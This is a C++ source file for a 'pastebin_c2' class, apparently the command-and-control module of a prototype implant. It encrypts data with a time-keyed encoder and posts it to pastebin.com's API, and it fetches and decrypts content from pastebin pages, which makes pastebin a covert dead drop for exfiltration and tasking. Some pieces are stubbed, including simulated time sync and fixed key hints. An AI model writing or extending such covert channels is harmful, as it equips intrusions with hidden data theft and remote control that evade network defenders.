#include "pastebin.h"
#include <iostream>
#include <ctime>

pastebin_c2::pastebin_c2(Comm* comm_module, crypto_encoder* encoder)
    : comm_module(comm_module), encoder(encoder), last_synced_time(0) {}

void pastebin_c2::sync_time() {
    // In a real implementation, we would perform a HEAD request to get the Date header.
    // For this prototype, we will simulate getting the time or use system time if network time isn't available.
    // TODO: Parse Date header from WinHTTP response.
    
    // Using system time as a fallback/simulation for now
    last_synced_time = std::time(nullptr);
}

std::string pastebin_c2::post_data(const std::string& data) {
    if (!comm_module || !encoder) return "";

    // 1. Sync time (or ensure it's recent)
    sync_time();
    
    // 2. Set context for encryption
    // Hint could be a random nonce or something derived from the state
    std::string hint = "post_hint"; 
    encoder->set_key_context(last_synced_time, hint);

    // 3. Encrypt the data
    std::string encrypted_data = encoder->encrypt(data);

    // 4. Send the request
    std::string response = comm_module->SendRequest(
        L"pastebin.com", 
        443, 
        L"/api/api_post.php", 
        L"POST", 
        encrypted_data
    );

    return response;
}

std::string pastebin_c2::fetch_data(const std::wstring& url) {
    if (!comm_module || !encoder) return "";

    // 1. Sync time
    sync_time();

    std::wstring server = L"pastebin.com";
    std::wstring path = url;

    // 2. Fetch the data
    std::string encrypted_response = comm_module->SendRequest(
        server, 
        443, 
        path, 
        L"GET"
    );

    if (encrypted_response.empty()) return "";

    // 3. Set context for decryption
    // Hint must match what was used to encrypt it (e.g., extracted from metadata or fixed)
    std::string hint = "fetch_hint"; 
    encoder->set_key_context(last_synced_time, hint);

    // 4. Decrypt the data
    std::string decrypted_data = encoder->decrypt(encrypted_response);

    return decrypted_data;
}
